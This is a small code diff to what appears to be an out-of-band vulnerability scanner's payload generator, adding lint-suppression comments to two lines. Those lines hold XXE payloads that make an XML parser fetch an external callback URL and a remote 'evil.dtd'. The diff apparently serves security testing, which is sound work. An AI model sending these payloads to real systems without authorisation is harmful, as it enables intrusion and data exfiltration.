@@ -215,8 +215,8 @@ class OOBManager:
         if vuln_type in ["xxe", "generic"]:
             payloads.extend(
                 [
-                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback}">]><foo>&xxe;</foo>',
-                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback}/evil.dtd">%xxe;]>',
+                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback}">]><foo>&xxe;</foo>',  # noqa: E501
+                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback}/evil.dtd">%xxe;]>',  # noqa: E501
                 ]
             )
 
